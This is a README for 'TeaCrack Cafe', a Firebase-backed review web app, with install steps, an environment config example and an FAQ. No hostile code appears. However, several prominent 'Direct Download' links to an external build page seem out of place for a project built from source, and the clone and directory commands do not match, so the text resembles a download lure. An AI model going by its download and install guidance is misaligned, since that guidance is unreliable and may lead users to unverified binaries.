# TeaCrack Cafe v1.0 - review platform 2026

> **TeaCrack Cafe is a responsive, web-based review platform built with Firebase and Firestore for submitting, moderating, and showing reviews in real time in version 1.0.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/danielhughes1993/teacrack-cafe-web-review?style=flat-square)](https://github.com/danielhughes1993/teacrack-cafe-web-review)

---

<p align="center">
  <a href="https://danielhughes1993.github.io/teacrack-cafe-web-review/">
    <img src="https://img.shields.io/badge/Download-TeaCrack%20Cafe%20Latest-brightgreen?style=for-the-badge" alt="Download TeaCrack Cafe">
  </a>
</p>

> **[Direct Download - TeaCrack Cafe v1.0](https://danielhughes1993.github.io/teacrack-cafe-web-review/)**

---

[Download Latest Build](https://danielhughes1993.github.io/teacrack-cafe-web-review/)

---

## Overview

TeaCrack Cafe is a streamlined review management web app that brings collection, moderation, and presentation into one interface. It is intended for browser-based use and relies on Firebase plus Firestore so review data can be saved and reflected live.

The project works well for teams or communities that want a lightweight way to handle user reviews without extra complexity. Its responsive design supports a range of screen sizes, and the setup is ready to deploy on Vercel with minimal friction.

---

## Key Capabilities

- Firestore-backed review storage with real-time updates
- One flow for submitting, approving, and displaying reviews
- Moderation controls for handling incoming feedback
- Environment variable based project configuration
- Responsive interface for desktop and mobile use
- Built with Vite for a modern development experience
- Deployment-ready layout for Vercel hosting
- Firebase-powered persistence for review data

---

## Installation

Clone the repository and install the project dependencies:

```bash
git clone https://github.com/danielhughes1993/teacrack-cafe-web-review.git
cd teacrack-cafe-web-app
npm install
```

Start the development server with the command provided by the project setup, then open the local address shown in the terminal.

For a production build, follow the standard Vite build workflow before deploying to your hosting platform.

---

## How to Use

TeaCrack Cafe is meant for collecting new reviews, reviewing them during moderation, and publishing approved entries for display.

Typical workflow:

1. Connect the app to your Firebase project.
2. Add the required environment variables.
3. Run the app locally to test the review flow.
4. Submit sample reviews and verify Firestore updates.
5. Approve or manage reviews through the moderation interface.
6. Deploy the finished build to Vercel when ready.

If you are preparing a hosted version, confirm that your Firebase and Firestore settings are correct before publishing.

---

## Configuration

Project settings are controlled through environment variables.

Example setup:

```env
VITE_FIREBASE_API_KEY=your_value
VITE_FIREBASE_AUTH_DOMAIN=your_value
VITE_FIREBASE_PROJECT_ID=your_value
VITE_FIREBASE_STORAGE_BUCKET=your_value
VITE_FIREBASE_MESSAGING_SENDER_ID=your_value
VITE_FIREBASE_APP_ID=your_value
```

If your deployment uses additional Firebase or hosting settings, store them in your local environment files and deployment dashboard rather than in the client bundle.

---

## Requirements

- Web browser
- Node.js and npm for local development
- Firebase project with Firestore enabled
- Environment variables for Firebase configuration
- Vercel account if you plan to deploy on Vercel

---

## FAQ

**How do I get started?**  
Clone the repository, install dependencies, add the Firebase environment values, and run the app locally.

**Where are reviews stored?**  
Reviews are managed through Firestore with real-time storage support.

**Can I moderate reviews before showing them?**  
Yes. The app includes submit, approve, and display behavior for review management.

**Does it support mobile screens?**  
Yes. The interface is responsive and designed to adapt across device sizes.

**What if the app is not connecting to Firebase?**  
Check your environment variables, project ID, and Firestore setup, then restart the app.

**How do I deploy it?**  
The project is prepared for Vercel deployment, so you can publish it through your Vercel workflow after configuring the required environment values.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
